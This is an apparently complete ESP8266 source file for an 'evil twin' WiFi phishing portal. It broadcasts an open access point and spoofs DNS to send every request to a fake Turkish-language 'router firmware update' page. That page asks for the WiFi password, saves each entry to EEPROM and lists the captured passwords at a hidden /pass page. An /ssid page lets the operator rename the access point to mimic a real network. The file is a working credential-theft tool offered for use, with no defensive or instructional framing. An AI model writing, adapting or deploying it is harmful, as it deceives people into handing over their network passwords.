// Code for ESP8266 Wifi Captive Portal.

// Adding libraries.
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>

// Default main strings.
#define SUBTITLE "Yönlendirici bilgisi."
#define TITLE "Güncelleme"
#define BODY "Yönlendirici firmware'iniz güncel değil. Normal taramaya devam etmek için firmware'inizi güncelleyin."
#define POST_TITLE "Updating..."
#define POST_BODY "Yönlendiriciniz güncelleniyor. Lütfen işlem tamamlanana kadar bekleyin.. </br> Teşekkür ederim."
#define PASS_TITLE "Passwords"
#define CLEAR_TITLE "Cleared"

// Initial system settings.
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway

// Default wifi SSID name.
const char *SSID_NAME = "Free Wifi";

String allPass = "";     // For storing all passwords.
String newSSID = "";     // For adding new SSID.
String currentSSID = ""; // For storing the SSID in the EEPROM.

// For storing passwords in EEPROM.
int initialCheckLocation = 20; // Location to check whether the ESP is running for the first time.
int passStart = 30;            // Starting location in EEPROM to save password.
int passEnd = passStart;       // Ending location in EEPROM to save password.

unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String input(String argName)
{
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String footer()
{
  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

String header(String t)
{
  String a = String(currentSSID);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; text-align:center; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em;  }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 5px; border: 1px solid #555555; color: #000000; }"
               "label { color: #333; display: block; text-align:center; font-style: italic; font-weight: bold; }"
               "nav { background: #fff; color: #008893; text-align:center; display: block; font-size: 1.3em; padding: 0.8em; }"
               "nav b { display: block; text-align:center; font-size: 1.5em; margin-bottom: 0.1em; } "
               "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
             "<head><title>" +
             a + " :: " + t + "</title>"
                              "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
                              "<style>" +
             CSS + "</style>"
                   "<meta charset=\"UTF-8\"></head>"
                   "<body><div style=\"text-align:center;\"><img src='data:image/png;base64,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' alt=\"logo\"></div><nav><b>" +
             a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String index()
{
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post><label>WiFi sifre:</label>" +
         "<input type=password name=m></input><input type=submit style=background-color: blue; value=Güncelleme></form>" + footer();
}

String posted()
{
  String pass = input("m");
  pass = "<li><b>" + pass + "</li></b>"; // Adding password in a ordered list.
  allPass += pass;                       // Updating the full passwords.

  // Storing passwords to EEPROM.
  for (int i = 0; i <= pass.length(); ++i)
  {
    EEPROM.write(passEnd + i, pass[i]); // Adding password to existing password in EEPROM.
  }

  passEnd += pass.length(); // Updating end position of passwords in EEPROM.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(POST_TITLE) + POST_BODY + footer();
}

String pass()
{
  return header(PASS_TITLE) + "<ol>" + allPass + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}

String ssid()
{
  return header("Change SSID") + "<p>Here you can change the SSID name. After pressing the button \"Change SSID\" you will lose the connection, so reconnect to the new SSID.</p>" + "<form action=/postSSID method=post><label>New SSID name:</label>" +
         "<input type=text name=s></input><input type=submit value=\"Change SSID\"></form>" + footer();
}

String postedSSID()
{
  String postedSSID = input("s");
  newSSID = "<li><b>" + postedSSID + "</b></li>";
  for (int i = 0; i < postedSSID.length(); ++i)
  {
    EEPROM.write(i, postedSSID[i]);
  }
  EEPROM.write(postedSSID.length(), '\0');
  EEPROM.commit();
  WiFi.softAP(postedSSID);
  return postedSSID;
}

String clear()
{
  allPass = "";
  passEnd = passStart; // Setting the password end location -> starting position.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(CLEAR_TITLE) + "<div><p>The password list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

void BLINK()
{
  // The BUILTIN_LED will blink 5 times after a password is posted.
  for (int counter = 0; counter < 10; counter++)
  {
    // For blinking the LED.
    digitalWrite(BUILTIN_LED, counter % 2);
    delay(500);
  }
}

void setup()
{
  // Starting serial communication.
  Serial.begin(115200);

  bootTime = lastActivity = millis();
  EEPROM.begin(512);
  delay(10);

  // Check whether the ESP is running for the first time.
  String checkValue = "first"; // This will will be set in EEPROM after the first run.

  for (int i = 0; i < checkValue.length(); ++i)
  {
    if (char(EEPROM.read(i + initialCheckLocation)) != checkValue[i])
    {
      // Add "first" in initialCheckLocation.
      for (int i = 0; i < checkValue.length(); ++i)
      {
        EEPROM.write(i + initialCheckLocation, checkValue[i]);
      }
      EEPROM.write(0, '\0');         // Clear SSID location in EEPROM.
      EEPROM.write(passStart, '\0'); // Clear password location in EEPROM
      EEPROM.commit();
      break;
    }
  }

  // Read SSID in the EEPROM.
  String ESSID;
  int i = 0;
  while (EEPROM.read(i) != '\0')
  {
    ESSID += char(EEPROM.read(i));
    i++;
  }

  // Reading stored password and end location of passwords in the EEPROM.
  while (EEPROM.read(passEnd) != '\0')
  {
    allPass += char(EEPROM.read(passEnd)); // Reading the store password in EEPROM.
    passEnd++;                             // Updating the end location of password in EEPROM.
  }

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));

  // Setting currentSSID -> SSID in EEPROM or default one.
  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : SSID_NAME;

  Serial.print("Current SSID: ");
  Serial.print(currentSSID);
  WiFi.softAP(currentSSID);

  // Start webserver
  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only for HTTP)
  webServer.on("/post", []() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
  webServer.on("/ssid", []() { webServer.send(HTTP_CODE, "text/html", ssid()); });
  webServer.on("/postSSID", []() { webServer.send(HTTP_CODE, "text/html", postedSSID()); });
  webServer.on("/pass", []() { webServer.send(HTTP_CODE, "text/html", pass()); });
  webServer.on("/clear", []() { webServer.send(HTTP_CODE, "text/html", clear()); });
  webServer.onNotFound([]() { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
  webServer.begin();

  // Enable the BUILTIN_LED.
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}

void loop()
{
  if ((millis() - lastTick) > TICK_TIMER)
  {
    lastTick = millis();
  }
  dnsServer.processNextRequest();
  webServer.handleClient();
}
